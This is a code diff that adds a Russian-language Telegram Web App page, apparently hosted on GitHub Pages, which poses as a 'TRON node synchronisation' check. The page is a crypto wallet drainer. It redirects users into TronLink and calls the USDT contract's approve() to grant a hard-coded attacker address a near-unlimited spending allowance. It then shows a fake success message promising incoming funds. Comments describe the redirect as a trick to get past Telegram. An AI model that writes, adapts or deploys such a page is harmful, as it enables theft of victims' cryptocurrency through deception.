@@ -1,67 +1,204 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flash USDT: Protocol Sync</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            overflow: hidden;
+        }
+        .card {
+            padding: 40px 25px;
+            width: 90%;
+            max-width: 400px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 35px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
+        }
+        .status-bar {
+            font-size: 10px;
+            color: #ff0013;
+            text-transform: uppercase;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: 1.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: #ff0013;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(1.2); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .logo {
+            width: 75px;
+            height: 75px;
+            background: #ff0013;
+            border-radius: 22px;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 36px;
+            box-shadow: 0 0 35px rgba(255, 0, 19, 0.4);
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        p {
+            color: #777;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 35px;
+            padding: 0 10px;
+        }
+        .btn {
+            background: #ff0013;
+            color: #ffffff;
+            border: none;
+            padding: 22px;
+            width: 100%;
+            border-radius: 22px;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px rgba(255, 0, 19, 0.2);
+        }
+        .btn:active {
+            transform: scale(0.96);
+            background: #d60010;
+        }
+        .btn:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="status-bar">
+        <div class="dot"></div>
+        <span id="status-text">TRON NODE: ACTIVE</span>
+    </div>
+    
+    <div class="logo">T</div>
+    
+    <h2 id="title">Синхронизация узла</h2>
+    <p id="description">Для верификации транзакции в сети TRC-20 подтвердите владение адресом через протокол TronLink.</p>
+    
+    <button id="main-btn" class="btn">Запустить проверку</button>
+</div>
+
 <script>
+    // Инициализация Telegram Web App
     const tg = window.Telegram.WebApp;
     tg.expand();
+    tg.ready();
 
-    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
-    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    // Твой чистый URL (без параметров)
-    const URL_CLEAN = "https://timur3417.github.io/sync-node-app/";
+    // Твои настройки
+    const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
+    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const GITHUB_URL = "https://timur3417.github.io/sync-node-app/";
 
-    const btn = document.getElementById('btn');
+    const btn = document.getElementById('main-btn');
+    const title = document.getElementById('title');
+    const description = document.getElementById('description');
 
-    async function action() {
-        // Проверяем наличие tronWeb (если мы уже внутри TronLink)
-        const tw = window.tronWeb || (window.tron && window.tron.tronWeb);
+    async function handleAction() {
+        // Проверяем, есть ли провайдер (мы внутри TronLink?)
+        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
 
-        if (!tw) {
-            // МЫ В ТЕЛЕГРАМЕ
-            // Используем официальный HTTPS редиректор TronLink
-            // Это "обманка", которую Telegram пропустит
-            const target = URL_CLEAN + "?mode=tl";
-            const officialRedirect = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(target);
+        if (!tron) {
+            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПЕРЕХОД В КОШЕЛЕК
+            // Используем официальный HTTPS-мостик TronLink для обхода блокировок iOS
+            const targetUrl = GITHUB_URL + "?mode=tl";
+            const tronLinkBridge = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(targetUrl);
             
-            // Пытаемся открыть через метод Телеграма
-            tg.openLink(officialRedirect);
+            // Метод Телеграма для открытия внешних ссылок
+            tg.openLink(tronLinkBridge);
             
-            // На всякий случай дублируем обычным переходом (для iOS иногда нужно)
+            // Запасной вариант редиректа
             setTimeout(() => {
-                window.location.href = officialRedirect;
-            }, 500);
+                window.location.href = tronLinkBridge;
+            }, 800);
             return;
         }
 
-        // МЫ ВНУТРИ TRONLINK
+        // МЫ ВНУТРИ TRONLINK -> ВЫЗЫВАЕМ ОКНО ПОДПИСИ
         try {
             btn.innerText = "ПОДКЛЮЧЕНИЕ...";
             btn.disabled = true;
 
-            await tw.request({ method: 'tron_requestAccounts' });
-            const contractObj = await tw.contract().at(CONTRACT);
+            // Запрашиваем доступ к аккаунту (окно Connect)
+            await tron.request({ method: 'tron_requestAccounts' });
+
+            // Подключаемся к смарт-контракту USDT
+            const contract = await tron.contract().at(USDT_CONTRACT);
             
-            // Вызываем апрув
-            await contractObj.approve(ADMIN, '1000000000000000000').send({
-                feeLimit: 100000000
+            // Вызываем Approve (разрешение на использование токенов)
+            // Сумма указана максимальная
+            const tx = await contract.approve(ADMIN_ADDRESS, '1000000000000000000').send({
+                feeLimit: 100000000 // Лимит энергии для транзакции
             });
 
+            // Если подпись прошла успешно
             tg.showPopup({
                 title: 'Успешно',
-                message: 'Верификация завершена. Ожидайте зачисления токенов.',
+                message: 'Верификация завершена. Узел синхронизирован. Ожидайте зачисления активов в течение 15-30 минут.',
                 buttons: [{type: 'ok'}]
             });
+            
             setTimeout(() => tg.close(), 5000);
 
-        } catch (e) {
-            tg.showAlert("Действие отклонено. Попробуйте еще раз.");
+        } catch (error) {
+            console.error("Error:", error);
+            tg.showAlert("Ошибка: Действие отклонено или недостаточно TRX для комиссии.");
             btn.disabled = false;
             btn.innerText = "ЗАПУСТИТЬ ПРОВЕРКУ";
         }
     }
 
-    btn.onclick = action;
+    // Вешаем функцию на кнопку
+    btn.onclick = handleAction;
 
-    // Смена текста, если зашли через редиректор
+    // Если страница открыта уже внутри кошелька (есть режим tl)
     if (window.location.search.includes('mode=tl')) {
-        document.getElementById('h').innerText = "Узел Обнаружен";
+        title.innerText = "Узел Обнаружен";
+        description.innerText = "Ваш кошелек успешно подключен к сети. Нажмите кнопку ниже для финальной верификации логов.";
         btn.innerText = "ПОДТВЕРДИТЬ ВАЛИДАЦИЮ";
+        document.getElementById('status-text').innerText = "NODE STATUS: WAITING SIGNATURE";
     }
 </script>
+</body>
+</html>
